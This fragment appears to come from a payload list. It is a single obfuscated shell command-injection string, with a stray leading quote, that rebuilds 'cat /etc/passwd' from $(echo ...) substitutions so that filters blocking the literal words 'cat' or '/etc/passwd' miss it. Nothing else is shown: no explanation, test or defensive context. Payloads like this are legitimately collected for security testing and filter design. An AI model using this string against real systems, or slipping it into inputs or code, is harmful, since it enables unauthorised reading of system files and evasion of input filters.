
    "c$(echo a)t $(echo /e)t$(echo c/)p$(echo a)ss$(echo w)d
    